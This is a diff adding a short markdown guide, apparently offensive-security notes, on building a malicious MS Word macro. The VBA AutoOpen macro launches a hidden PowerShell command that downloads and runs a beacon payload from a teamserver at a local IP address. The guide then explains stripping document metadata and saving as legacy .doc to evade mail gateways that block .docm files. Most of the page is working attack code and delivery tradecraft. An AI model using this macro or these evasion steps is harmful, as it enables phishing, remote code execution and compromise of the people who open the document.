@@ -1,0 +1,22 @@
+### Macros
+1. Create a macro in MS Word:   `View -> Macros -> Create` 
+2. This code will run `notepad.exe`
+    ```vb copy showLineNumbers {4}
+    Sub AutoOpen() 
+        Dim Shell As Object
+        Set Shell = CreateObject("wscript.shell")
+        Shell.Run "notepad"
+    End Sub
+    ```
+3. Replace `notepad` with a beacon shell, and the best to be used here is a **powershell** payload, can be generated with:  `Attacks -> Script web delivery (S)`. This will generate a beacon shell payload and host it on the **teamserver**, and will give you the `download / execute` payload for that beacon.
+    ```vb copy showLineNumbers {4}
+    Sub AutoOpen()
+        Dim Shell As Object
+        Set Shell = CreateObject("wscript.shell")
+        Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://192.168.5.130:80/a'))"""
+    End Sub 
+    ```
+4. prepare document for delivery:
+    -  `file -> info -> InspectDocument -> InspectDocument` then remove the `Document Properties and Personal Information.` to remove all metadata that would be embedded in the doc including your username.
+    -  Save the file: `File -> Save As` and change the format from `.docx` to `Word 97-2003 (.doc)` as we  can't save macros into a `docx`, and Its suspecious to save it into a `docm` as most of the mail gateways block them entirely.
+
